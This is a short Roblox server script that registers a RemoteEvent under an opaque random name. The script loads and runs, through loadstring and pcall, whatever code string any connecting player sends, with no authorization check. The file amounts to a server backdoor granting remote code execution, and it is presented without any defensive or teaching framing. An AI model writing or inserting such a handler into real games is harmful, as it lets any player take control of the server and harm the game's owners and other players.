-- Server-side script for the 'G7M2X9B4P8QF1LD' RemoteEvent

local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- Create the RemoteEvent if it doesn't exist
local remote = ReplicatedStorage:FindFirstChild("G7M2X9B4P8QF1LD")
if not remote then
    remote = Instance.new("RemoteEvent")
    remote.Name = "G7M2X9B4P8QF1LD"
    remote.Parent = ReplicatedStorage
end

-- Listen for incoming code from clients and execute it
remote.OnServerEvent:Connect(function(player, code)
    print(player.Name .. " sent code to execute:")
    print(code)
    
    -- Attempt to load the code as a Lua function
    local func, loadError = loadstring(code)
    if func then
        -- Run the code safely with pcall to catch errors
        local success, runtimeError = pcall(func)
        if not success then
            warn("Runtime error while executing code from " .. player.Name .. ": " .. tostring(runtimeError))
        end
    else
        warn("Failed to load code from " .. player.Name .. ": " .. tostring(loadError))
    end
end)
